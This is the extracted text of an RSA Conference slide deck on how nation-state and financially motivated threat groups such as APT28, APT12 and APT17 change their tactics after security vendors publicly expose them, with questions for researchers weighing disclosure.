#RSAC

Show of Hands

Have you ever been directly involved in a public 
white paper or blog about a threat actor? 



#RSAC

Show of Hands

Do you use vendor white papers or blogs to develop better 
situational awareness about threats to your organization?

Glossary of Terms

4Photo: @kecia85 on Flickr

“APT” Groups: Groups conducting network 
operations on behalf of a nation state. Includes 
cyber espionage and network attack activity. 

“FIN” Groups: Well organized, capable 
intrusion teams that conduct intrusions for 
financial gain. Seek to steal information that 
can be monetized.  

TTPs: “Tactics, Techniques and Procedures” – the “toolkit” 
and methods threat actors use to achieve their objectives.  



#RSAC

Research Question 

How do threat groups respond 
when their operations are 
exposed in public reporting? 



#RSAC

Bottom Line Up Front

Public exposure is a major 
trigger for behavioral change



#RSAC

Apply 

Evaluate the 
impact of a blog or 
white paper on an 
adversary’s future 
operations

#RSAC

Why Does Exposure Matter? 

Security vendors sprint to detect publicized 
activity

Net defenders more likely to hunt in their 
networks for evidence of a group, employ new 
IOCs or detection methods 

Exposure triggers public awareness and increases threat groups’ risk of 
detection/discovery.

Public spotlight creates a flashpoint 
of awareness of a group’s ops, TTPS



#RSAC

Why Does Exposure Matter – Big Picture 

What ethical boundaries and obligations do 
security researchers face? 

Are we cultivating better OPSEC in the actors 
we expose? 

What is the best way to share? 

Mission vs. Marketing 



#RSAC

Key Concept

“Response from adversaries to perceived safeguards 
and/or countermeasures, in which the adversaries 
change some characteristic of their [operations] in 
order to avoid and/or overcome those 
safeguards/countermeasures”

Threat Shifting 

— NIST Special Publication 800-30: Guide for Conducting Risk Assessments



#RSAC

Threat Shifting in Nature 

Mimickry: Heliconius butterflies mimic wing coloration patterns to signal toxicity to predators 

Evolution to reduce the risk of predation



#RSAC

Threat Shifting in Information Security

Evolution of banking Trojans from clumsy 
keyloggers to highly flexible webinject offerings

Adoption of Powershell and WMI for lateral 
movement and backdoor functionality 

Examples of Threat Shifting

TIMING TARGETS RESOURCES
PLANNING & 

METHODS

Threat shifting occurs across four domains: 



#RSAC

Trigger Points for Threat Shifting

Exposure 

Remediation

Detection 



#RSAC

A caveat…

Our observations are based 

on  FireEye’s visibility.



#RSAC

Research Question 

How do threat groups respond 
when their operations are 
exposed in public reporting? 



#RSAC

They know.

Threat groups are often keenly aware of 
research & reporting on their operations.  



#RSAC

July 2015 blog on APT28 spear phishing campaign 
that leveraged a Java zero-day

Within 1 day, APT28 updated DNS info for domain 
hosting exploit to point to TrendMicro’s IP space 

APT28 signals they are aware of security 
researchers’ blogs (and none too pleased…)

They know.

* APT28 aka Pawn Storm, Sednit, Sofacy, Fancy Bear, Strontium 



#RSAC

Keenly aware of research and reporting

APT1: Major interruption to APT1’s operations

Careto/Mask: “…after the post was published, the 
Mask operators shut everything down within 
about four hours” 

APT3 aka UPS: Changed tactics on the fly in direct 
response to FireEye blog 

Threat Actors Read the News, Too.

Not only are they keenly aware… 

Some actors actively 

seek to MANIPULATE
public perception.

Public reports can be deeply disruptive to a 
threat group’s operations… or not. 

Incentives matter.

APT12: “Darwin’s Favorite APT Group”

APT12 aka DNSCALC, IXESHE, CALC Team, DynCalc, Numbered Panda 

• Jan. 31, 2013: New York Times exposes APT12 intrusion in their 

environment

- Exposure triggered brief pause in activity and 

immediate changes in TTPs

• June 6, 2014: APT12’s RIPTIDE aka Etumbot backdoor is the 

subject of a comprehensive white paper

- White paper triggered rapid shift in toolset.

#RSAC

Operation SMN — APT17 Interdiction 

APT17 aka Axiom, DeputyDog, Tailgater Team, Hidden Lynx, Voho, Group72, AuroraPanda

More than an exposure effort:

- Coalition sought to eradicate specific ‘high value’ tools and  

make it more expensive for APT17 to operate 

- Coordinated action was accompanied by public materials to 

aid detection and educate victims 

Operation SMN coalition went into the 

effort with eyes wide open:

- Acknowledged from outset that APT17 was skilled, equipped 

to adapt and would very likely retool

In Summary… 



#RSACHide and Seek: How Threat Actors Respond in the 
Face of Public Exposure 

Threat actors are often keenly aware of reporting on 
their operations

Exposure can disrupt an actor’s operations… if the 
incentives are right. 

Public reporting triggers retooling 

Actors may abandon tools or develop new ones.

The path of least resistance is often king.

Sometimes, actors solve the problem by adding 
resources: time, money, tool development

Key Takeaways 



#RSAC

Exposure is a 
balancing act 
Security researchers must continually weigh 
the benefits of public awareness against 
possible disruptions to detection and loss of 
visibility. 

When executed well, exposure benefits 
victims, network defenders and the security 
community at large.  

Hide and Seek: How Threat Actors Respond in the 
Face of Public Exposure 



#RSAC

Questions to Ask 

- What impact do we want to have on the adversary? 

- How will exposure help/hurt victims and likely future 

targets? 

- How will exposure impact ‘big picture’ concerns like 

law enforcement efforts?  

- Will exposure degrade our ability to detect and 

respond to future activity?

- How adaptive and capable is the group? 

- Groups with a flat toolset and low adaptive 

capability are more likely to be disrupted 

- How determined are they to maintain access to 

specific targets? 

- What shifts to targeting, timing, resourcing & TTPs 

is the actor likely to make?

When evaluating whether exposing an adversary 
is the best course of action: 

When evaluating how a threat actor will likely 
respond when their operations are exposed:
